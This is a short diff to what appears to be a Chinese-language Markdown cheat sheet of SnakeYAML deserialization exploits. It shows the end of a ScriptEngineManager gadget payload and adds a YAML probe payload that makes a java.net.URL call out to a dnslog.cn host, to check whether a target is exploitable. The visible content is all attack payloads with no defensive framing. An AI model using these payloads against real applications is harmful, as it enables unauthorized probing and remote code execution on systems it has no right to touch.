@@ -14,3 +14,11 @@ String data2 = "!!javax.script.ScriptEngineManager [\n" +
                 "  ]]\n" +
                 "]";
 ```
+
+## 判断存在链
+
+```java
+
+poc = "key: [!!java.lang.String []: 0, !!java.net.URL [null, \"http://5ydl3f.dnslog.cn​\"]: 1]";
+
+```
